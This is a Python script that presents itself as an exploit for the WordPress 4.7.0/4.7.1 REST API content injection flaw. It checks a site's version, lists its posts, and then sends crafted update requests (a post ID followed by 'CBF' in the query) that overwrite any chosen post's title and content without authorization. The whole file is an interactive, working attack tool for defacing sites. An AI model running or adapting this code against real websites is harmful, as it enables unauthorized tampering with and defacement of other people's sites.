#! /usr/bin/env python

"""
Technical Explanation: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
REST API Wordpress reference: https://developer.wordpress.org/rest-api/reference/posts/#update-a-post
Wordpress Version Affected: 4.7.0/4.7.1

2017 - Coded by snoww0lf.
"""
import re
import json
import urllib2

class WpContent:
	def __init__(self, url):
		self.__url = url
		self.__response = urllib2.urlopen(self.__url).read()

	def get_api_wp(self):
		return re.findall(r"https://api.w.org/' href='(.*)'", self.__response)[0]

	def get_wp_version(self):
		check_version = re.findall(r'ver=(.*)"', self.__response)[0]
		if check_version == "4.7" or check_version == "4.7.1":
			check_version += " ( Maybe vulnerable to inject ) "
		else:
			check_version += " ( Maybe not vulnerable to inject ) "
		return check_version

	def get_wp_post_information(self):
		get_post = urllib2.urlopen(self.get_api_wp()+"wp/v2/posts").read()
		load_info = json.loads(get_post)
		collected_information = ""
		for load in load_info:
			collected_information += "[x] Post ID: {0}\n[x] Post Title: {1}\n[x] Post URL: {2}\n[x] Post Content: {3} [SNIPPET]\n\n".\
			format(load['id'], load['title']['rendered'].encode("utf-8"), load['link'], load['content']['rendered'][:100].encode('utf-8'))
		return collected_information

	def inject_content(self, id_content, title, content):
		data = json.dumps({
			'title':title,
			'content':content
			})
		params = {'Content-Type':'application/json'}
		full_url = self.get_api_wp() + "wp/v2/posts/{0}/?id={0}CBF".format(id_content)
		req = urllib2.Request(full_url, data, params)
		resp = urllib2.urlopen(req).read()
		return resp

def main():
	print("[X] WORDPRESS 4.7.0/4.7.1 CONTENT INJECTION EXPLOIT BY snoww0lf [X]\n")
	while True:
		url = raw_input("[x] Enter the URL: ")
		print("[?] Please wait ...\n")
		wpcontent = WpContent(url)
		wp_version = wpcontent.get_wp_version().split()[0]
		print("[x] Wordpress Version: {0} ".format(wp_version))
		if(wp_version == "4.7" or wp_version == "4.7.1"):
			select = raw_input("[x] It's affected version. It seems vulnerable, continue? [y/n] ").lower()
			while(select != "y" and select != "n"):
				print("[x] Wrong selection! Try again.")
				select = raw_input("[x] Affected version. Seems vulnerable, continue? [y/n] ").lower()
			print("\n")
			if(select == "y"):
				print("[x] Parsing data information, please wait ...\n")
				wp_information = wpcontent.get_wp_post_information()
				print(wp_information)
				inp_id = input("[x] Enter ID Content that you want to overwrite: ")
				inp_title = raw_input("[x] Change title: ")
				print("\n")
				print("=> 1. Load data from file.")
				print("=> 2. Input data.")
				print("\n")
				mode = input("[x] Change content by [1/2] ? ")
				if mode == 1:
					dfile = raw_input("[x] Enter the filename: ")
					with open(dfile, 'r') as f:
						readf = f.readlines()
					print("[x] Exploit in progress ...\n")
					wpcontent.inject_content(inp_id, inp_title, ''.join(readf))
				else:
					inp_data = raw_input("[?] Input data: ")
					print("[x] Exploit in progress ...\n")
					wpcontent.inject_content(inp_id, inp_title, inp_data)
				print("[x] Update success!\n")
				cont = raw_input("[?] Continue ? [y/n] ").lower()
				while(cont != "y" and cont != "n"):
					print("[x] Wrong selection! Try again.")
					cont = raw_input("[?] Continue ? [y/n] ").lower()
				if cont == "n": break
			else:
				break
		else:
			cont = raw_input("[?] Continue ? ").lower()
			while(cont != "y" and cont != "n"):
				print("[x] Wrong selection! Try again.")
				cont = raw_input("[?] Continue ? ").lower()
			if cont == "n": break

if __name__ == '__main__':
	main()